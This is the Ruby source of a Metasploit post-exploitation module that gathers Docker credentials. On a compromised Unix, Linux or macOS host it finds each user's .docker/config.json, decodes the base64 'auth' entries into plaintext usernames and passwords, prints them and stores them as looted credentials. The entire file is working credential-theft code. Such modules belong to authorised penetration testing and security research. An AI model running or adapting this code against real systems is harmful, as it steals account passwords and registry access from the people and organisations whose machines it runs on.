##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'json'

class MetasploitModule < Msf::Post
  include Msf::Post::File
  include Msf::Post::Unix

  def initialize(info={})
    super( update_info(info,
      'Name'           => 'Multi Gather Docker Credentials Collection',
      'Description'    => %q{
          This module will collect the contents of all users' .docker directories on the targeted
          machine. If the user has already push to docker hub, chances are that the password was
          saved in base64 (default behavior).
      },
      'License'        => MSF_LICENSE,
      'Author'         => ['Flibustier'],
      'Platform'       => %w{ bsd linux osx unix },
      'SessionTypes'   => ['shell']
    ))
  end

  # This module is largely based on gpg_creds.rb.

  def run
    print_status("Finding .docker directories")
    paths = enum_user_directories.map {|d| d + "/.docker"}
    # Array#select! is only in 1.9
    paths = paths.select { |d| directory?(d) }

    if paths.nil? || paths.empty?
      print_error("No users found with a .docker directory")
      return
    end

    download_loot(paths)
  end

  def download_loot(paths)
    print_status("Looting #{paths.count} directories")
    paths.each do |path|
      path.chomp!
      file = "config.json"
      target = "#{path}/#{file}"

      if file? target
        print_status("Downloading #{target} -> #{file}")
        extract(target)
      end
    end
  end

  def extract(target)
    file = read_file(target)
    parsed = JSON.parse(file)
    if parsed["auths"]
      parsed["auths"].each do |key, value|
        vprint_status("key: #{key}")
        value.each do |k,v|
          if k == "auth"
            plain = Rex::Text.decode_base64(v)
            if plain.include? ":"

              print_good("Found #{plain}")
              username, password = plain.split(':')
              credential_data = {
                origin_type: :import,
              module_fullname: self.fullname,
              filename: target,
              workspace_id: myworkspace_id,
              service_name: 'docker',
              realm_value: key,
              realm_key: Metasploit::Model::Realm::Key::WILDCARD,
              private_type: :password,
              private_data: password,
              username: username
            }
            create_credential(credential_data)

            print_good("Saved credentials")
            end
          end
        end
      end
    else
      print_status("No credentials found in config file")
    end
  end
end
